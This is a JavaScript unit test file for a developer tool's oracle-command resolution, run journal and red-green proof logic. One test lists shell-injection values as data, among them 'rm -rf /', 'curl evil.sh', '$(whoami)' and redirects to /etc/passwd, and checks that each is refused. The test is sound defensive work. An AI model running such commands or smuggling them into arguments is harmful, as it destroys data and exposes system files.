import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { importTs } from "./_tsload.mjs";

/**
 * Unit tests for the PURE half of oracle execution (ADR-0036): command
 * resolution and the run journal in `src/storage/oracles.ts`, the seal home in
 * `src/storage/spec.ts`, and the `gates.test_one` key in `src/storage/schema.ts`.
 *
 * Compiled in-process through `_tsload.mjs` (the `verify-block.test.mjs` shape),
 * so none of this depends on the committed bundle. The tool surface — the
 * `oracles` action, the delivery gate's advisory field — is driven over stdio in
 * `verify.test.mjs`, because that is where a child process exists at all.
 */

const oracles = await importTs("src/storage/oracles.ts");
const { resolveOracleCommand, oracleTestFile, recordOracleRun, readOracleRuns, redGreenProof } =
  oracles;
// Every `importTs` call runs a fresh esbuild bundle, so they are all hoisted to
// module load: a compile started mid-run competes for the CPU with whatever
// wall-clock-sensitive test is executing in a sibling file at that moment.
const { contractHash, SpecContract } = await importTs("src/storage/spec.ts");
const { loadConfig } = await importTs("src/storage/config.ts");

const here = dirname(fileURLToPath(import.meta.url));
const ORACLES_SRC = join(here, "..", "src", "storage", "oracles.ts");

function withTmp(fn) {
  const dir = mkdtempSync(join(tmpdir(), "marvin-oracles-"));
  try {
    return fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

/** A criterion the way the spec-contract schema produces one. */
const criterion = (oracle, id = "AC1") => ({
  id,
  statement: "it works",
  implemented_by: ["F1"],
  oracle,
});

/** A journal entry with every required field, overridable per case. */
const entry = (over = {}) => ({
  slug: "demo",
  contract_sha: "aaaaaaaaaaaaaaaa",
  criterion: "AC1",
  expect: "pass",
  status: "pass",
  command: "pytest x.py::t",
  source: "config.test_one",
  code: 0,
  signal: null,
  test_file: "x.py",
  test_sha: "1111111111111111",
  head_sha: "abcdef1",
  ran_at: "2026-08-13T10:00:00.000Z",
  ...over,
});

// ── AC1: the seal is over raw text, so the schema addition needs no migration ─

/**
 * A block recorded VERBATIM in the shape it had before `oracle.run` existed,
 * together with the 16-hex digest it carried then, pinned as a literal.
 *
 * The literal is the whole point. A test that hashes this block with
 * `contractHash` on both sides asserts `hash(x) === hash(x)`, which holds under
 * every implementation including a broken one — a normalising or re-serialising
 * hash input would pass it and silently invalidate every `contract_sha` already
 * stamped into a sealed spec on disk. The real corpus cannot serve as the
 * fixture either: `.gitignore` excludes `.marvin/*`, so CI has no sealed spec to
 * walk. Hence a verbatim string and a hard-coded digest.
 */
const PRE_CHANGE_BLOCK = `files:
  - id: F1
    path: src/thing.ts
    action: edit
    intent: make the thing work
    satisfies: [AC1]
build_order: [F1]
depends_on: []
contract:
  kind: none
criteria:
  - id: AC1
    statement: the thing works
    implemented_by: [F1]
    oracle:
      kind: test
      ref: test/thing.test.mjs::the thing works
    failure: the thing does not work
`;
const PRE_CHANGE_DIGEST = "bf3ac7749c483f95";

test("a pre-change block still hashes to its recorded literal digest and a run key parses", () => {
  assert.equal(
    contractHash(PRE_CHANGE_BLOCK),
    PRE_CHANGE_DIGEST,
    "adding oracle.run moved the seal of a block already on disk — every sealed spec now reads TAMPERED",
  );

  // The other half: a block that DOES carry `run` is accepted by the schema.
  const withRun = SpecContract.safeParse({
    files: [{ id: "F1", path: "src/thing.ts", action: "edit" }],
    criteria: [
      {
        id: "AC1",
        statement: "the thing works",
        implemented_by: ["F1"],
        oracle: { kind: "test", ref: "test/thing.test.mjs::t", run: "pytest test/thing.py::t" },
      },
    ],
  });
  assert.ok(withRun.success, withRun.error?.issues?.[0]?.message);
  assert.equal(withRun.data.criteria[0].oracle.run, "pytest test/thing.py::t");
});

// ── AC2: the declared key survives the schema ────────────────────────────────

test("a configured test_one survives loadConfig and is readable by resolution", () =>
  withTmp((dir) => {
    const configPath = join(dir, "config.json");
    writeFileSync(
      configPath,
      JSON.stringify({ gates: { test: "npm test", test_one: "npx mocha --grep '{name}'" } }),
      "utf8",
    );

    // Fails without the declared key: zod strips what the schema does not name,
    // and ADR-0009 records that as accepted — so the value would vanish here
    // with no error anywhere to observe.
    const { config } = loadConfig(configPath);
    assert.equal(config.gates.test_one, "npx mocha --grep '{name}'");
    assert.equal(config.gates.test, "npm test", "the four gate keys are unaffected");

    const resolved = resolveOracleCommand(
      criterion({ kind: "test", ref: "test/a.test.mjs::adds two numbers" }),
      { testOne: config.gates.test_one, projectRoot: dir },
    );
    assert.equal(resolved.source, "config.test_one");
    assert.equal(resolved.command, "npx mocha --grep 'adds two numbers'");
  }));

// ── AC3: the precedence chain, and its silence ───────────────────────────────

test("resolution follows call, run, ref, test_one, stack default, then not-run", () =>
  withTmp((dir) => {
    const testOracle = { kind: "test", ref: "pkg/test_thing.py::test_works", run: "run-me" };
    const opts = { testOne: "vitest -t '{name}' {file}", stack: "python", projectRoot: dir };

    // 1. the per-call argument outranks everything a spec or a config declares
    assert.deepEqual(resolveOracleCommand(criterion(testOracle), { ...opts, call: "exact cmd" }), {
      command: "exact cmd",
      source: "call",
    });

    // 2. the criterion's own `run`
    assert.deepEqual(resolveOracleCommand(criterion(testOracle), opts), {
      command: "run-me",
      source: "oracle.run",
    });

    // 3. a command ref, verbatim — that is already what a command ref means
    assert.deepEqual(
      resolveOracleCommand(criterion({ kind: "command", ref: "npm run smoke" }), opts),
      { command: "npm run smoke", source: "oracle.ref" },
    );

    // 4. the project's template, with {file} / {name} / {ref} substituted
    const viaConfig = resolveOracleCommand(
      criterion({ kind: "test", ref: "pkg/test_thing.py::test_works" }),
      opts,
    );
    assert.deepEqual(viaConfig, {
      command: "vitest -t 'test_works' pkg/test_thing.py",
      source: "config.test_one",
    });

    // 5. the three-row default table, only when no template is declared
    const noTemplate = { stack: "python", projectRoot: dir };
    assert.deepEqual(
      resolveOracleCommand(criterion({ kind: "test", ref: "pkg/test_thing.py::test_works" }), {
        ...noTemplate,
      }),
      { command: "pytest pkg/test_thing.py::test_works", source: "stack-default" },
    );
    assert.equal(
      resolveOracleCommand(criterion({ kind: "test", ref: "pkg/thing_test.go::TestWorks" }), {
        stack: "go",
        projectRoot: dir,
      }).command,
      "go test -run '^TestWorks$' ./pkg",
    );
    assert.equal(
      resolveOracleCommand(criterion({ kind: "test", ref: "src/lib.rs::works" }), {
        stack: "rust",
        projectRoot: dir,
      }).command,
      "cargo test works",
    );

    // 6. no rung applies → not-run with a reason, never a guess.
    // A JavaScript/TypeScript project matches NO default row on purpose: this
    // repository's own `npm test` fans out to node:test, vitest and Playwright,
    // so a synthesized single-test command would run the wrong workspace's suite
    // and report green from one that never contained the test.
    for (const stack of ["node", "typescript", "deno", undefined]) {
      const out = resolveOracleCommand(criterion({ kind: "test", ref: "test/a.test.mjs::adds" }), {
        stack,
        projectRoot: dir,
      });
      assert.deepEqual(
        out,
        { command: null, source: null, reason: "no-single-test-command" },
        `stack ${stack} must resolve nothing rather than guess`,
      );
    }

    // prose-review has no command by construction, and a ref-less oracle none to build from
    assert.equal(
      resolveOracleCommand(criterion({ kind: "prose-review" }), opts).reason,
      "prose-review-oracle",
    );
    assert.equal(resolveOracleCommand(criterion({ kind: "test" }), opts).reason, "no-ref");

    // the file half of a `path::name` ref is what the runner hashes
    assert.equal(oracleTestFile(criterion(testOracle)), "pkg/test_thing.py");
    assert.equal(oracleTestFile(criterion({ kind: "command", ref: "npm run x" })), null);
  }));

// ── AC4: refusal, not sanitisation ───────────────────────────────────────────

test("a ref carrying shell metacharacters is not-run and never executed", () =>
  withTmp((dir) => {
    const opts = { testOne: "pytest '{file}::{name}'", stack: "python", projectRoot: dir };
    const hostile = [
      "test/a.py::t; rm -rf /",
      "test/a.py::t && curl evil.sh",
      "test/a.py::t | tee out",
      "test/a.py::$(whoami)",
      "test/a.py::`id`",
      "test/a.py::t > /etc/passwd",
      "test/a.py::t < /etc/passwd",
      "test/a.py::t\nrm -rf /",
    ];
    for (const ref of hostile) {
      const out = resolveOracleCommand(criterion({ kind: "test", ref }), opts);
      assert.deepEqual(
        out,
        { command: null, source: null, reason: "unsafe-ref" },
        `${JSON.stringify(ref)} must be refused, not quoted`,
      );
    }
    // A `kind: command` ref is NOT screened, and that boundary is the criterion's
    // "substituted value" half taken literally: such a ref is the whole command,
    // exactly as `oracle.run` is, and is substituted into no template. Screening
    // it refused 24 of this repository's own 44 command oracles — every one a
    // deliberate `a && b` chain a human wrote out — so the feature would have
    // shipped inert for most of the corpus while blaming the author's ref.
    assert.deepEqual(
      resolveOracleCommand(
        criterion({ kind: "command", ref: "npm run lint && node scripts/verify-dist.mjs" }),
        opts,
      ),
      { command: "npm run lint && node scripts/verify-dist.mjs", source: "oracle.ref" },
      "a command ref runs verbatim — the screen guards interpolation, not declaration",
    );

    // "never executed" is structural, not a promise: the pure module cannot
    // spawn. If a child process ever appears here, the screen stops being the
    // last thing standing between a malformed ref and a shell.
    const src = readFileSync(ORACLES_SRC, "utf8");
    assert.ok(!/child_process/.test(src), "storage/oracles.ts must not import child_process");
  }));

// ── AC7 / AC11: the journal, and what counts as a proof ──────────────────────

test("a journal entry at another contract_sha is not readable as a proof", () =>
  withTmp((dir) => {
    const runsDir = join(dir, "runs");
    const SHA = "aaaaaaaaaaaaaaaa";
    const OLD = "bbbbbbbbbbbbbbbb";

    // A complete red→green pair, recorded under a contract that has since been
    // superseded. Reading it as a proof is the exact silent-pass this filter
    // exists to remove.
    recordOracleRun(runsDir, entry({ contract_sha: OLD, expect: "fail", status: "fail", code: 1 }));
    recordOracleRun(runsDir, entry({ contract_sha: OLD }));
    assert.equal(redGreenProof(readOracleRuns(runsDir, "demo"), SHA, "AC1"), "missing");
    assert.equal(
      redGreenProof(readOracleRuns(runsDir, "demo"), OLD, "AC1"),
      "proven",
      "the same entries ARE a proof under their own contract — the filter is by sha, not a blanket refusal",
    );

    // An unreadable block is dropped; the file, and the proofs around it, are not.
    const path = join(runsDir, "demo.oracles.md");
    writeFileSync(
      path,
      `${readFileSync(path, "utf8")}\`\`\`json oracle-run\n{not json\n\`\`\`\n`,
      "utf8",
    );
    assert.equal(readOracleRuns(runsDir, "demo").length, 2);

    // An absent journal is an empty read and an unproven criterion.
    assert.deepEqual(readOracleRuns(join(dir, "nope"), "demo"), []);
    assert.equal(redGreenProof([], SHA, "AC1"), "missing");
  }));

test("a proof is a red then a green at one contract_sha over one unchanged test file", () =>
  withTmp((dir) => {
    const runsDir = join(dir, "runs");
    const SHA = "aaaaaaaaaaaaaaaa";
    const red = entry({ expect: "fail", status: "fail", code: 1 });
    const green = entry();

    // the positive case, asserted so a `() => "missing"` stub cannot ship
    assert.equal(redGreenProof([red, green], SHA, "AC1"), "proven");

    // order matters: a green that predates the red proves nothing about the fix
    assert.equal(redGreenProof([green, red], SHA, "AC1"), "missing");
    // and so does either half alone
    assert.equal(redGreenProof([red], SHA, "AC1"), "missing");
    assert.equal(redGreenProof([green], SHA, "AC1"), "missing");
    // a test file rewritten between the phases makes them two different tests
    assert.equal(
      redGreenProof([red, { ...green, test_sha: "2222222222222222" }], SHA, "AC1"),
      "missing",
    );
    // a `not-run` red is not a red: a signal kill and a launch failure land here
    assert.equal(
      redGreenProof([{ ...red, status: "not-run", code: null }, green], SHA, "AC1"),
      "missing",
    );
    // another criterion's pair is not this criterion's
    assert.equal(redGreenProof([red, green], SHA, "AC2"), "missing");
    // an unsealed spec has no key, so nothing is a proof
    assert.equal(redGreenProof([red, green], "", "AC1"), "missing");

    // append-only: a second call adds blocks, it does not rewrite the file
    mkdirSync(runsDir, { recursive: true });
    recordOracleRun(runsDir, red);
    const afterFirst = readFileSync(join(runsDir, "demo.oracles.md"), "utf8");
    recordOracleRun(runsDir, green);
    const afterSecond = readFileSync(join(runsDir, "demo.oracles.md"), "utf8");
    assert.ok(afterSecond.startsWith(afterFirst), "the earlier run must survive the later one");
    assert.equal(redGreenProof(readOracleRuns(runsDir, "demo"), SHA, "AC1"), "proven");
  }));
